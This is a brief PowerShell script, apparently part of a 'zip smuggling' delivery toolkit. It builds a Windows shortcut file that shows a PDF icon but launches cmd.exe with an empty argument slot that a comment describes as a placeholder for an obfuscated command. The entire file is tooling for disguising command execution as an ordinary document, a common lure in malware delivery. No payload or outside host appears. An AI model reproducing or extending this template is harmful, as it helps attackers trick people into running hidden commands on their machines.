$WshShell = New-Object -comObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut("$PSScriptRoot\cmd_template.lnk")
$Shortcut.IconLocation = 'C:\Users\clandestine\Documents\devops\zip_smuggling\template\JumplistFilesIcons\pdf.ico'
$Shortcut.TargetPath = 'C:\Windows\System32\cmd.exe'
# Template for CMD obfuscation - will be replaced with obfuscated command
$Shortcut.Arguments = '/v /c ""'
$Shortcut.WorkingDirectory = '%CD%'
$Shortcut.Save() 